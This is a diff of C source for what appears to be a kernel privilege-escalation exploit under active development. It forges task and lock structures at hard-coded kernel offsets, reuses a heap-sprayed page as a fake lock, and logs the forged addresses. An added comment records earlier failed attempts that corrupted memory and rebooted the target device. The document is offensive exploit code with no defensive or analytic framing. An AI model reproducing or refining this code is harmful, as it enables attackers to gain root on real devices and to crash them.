@@ -1874,10 +1874,26 @@ static void uid0_w2_overlay(void) {
   uint64_t it_off = (active_offsets && active_offsets->off_init_task)
                         ? active_offsets->off_init_task
                         : 0x027CC000ULL;
+  /*
+   * 09-12 kill taxonomy: (1) empty_zero_page writes corrupt the page
+   * mapped in EVERY process's anonymous memory -> random process death
+   * -> watchdog reboot / boot logo hang; (2) bss_tail = init_pg_dir
+   * (page-table poison); (3) multi-ghost residue. UID0_SPRAY_LOCK: keep
+   * the SPRAYED page as fake_lock — the 08-30 canary landed AND the
+   * boot survived 1425s+ with it.
+   */
+  if (env_flag("UID0_SPRAY_LOCK", 0) && page_base) {
+    fake_lock = page_base;
+    fake_task = page_base + FAKE_TASK_OFF;
+    pr_info("W2 overlay SPRAYED lock=%016zx task=%016zx\n",
+            fake_lock, fake_task);
+    pselect_child_node = 1;
+    return;
+  }
   fake_task = data_addr(KIMAGE_TEXT_BASE + it_off);
   fake_lock = data_addr(KIMAGE_TEXT_BASE +
       (active_offsets && active_offsets->off_bss_tail_lock
-           ? active_offsets->off_bss_tail_lock
+           ? (uint64_t)active_offsets->off_bss_tail_lock
            : 0x02BB9D00ULL));
   page_base = fake_lock;
   if (!fake_fops)
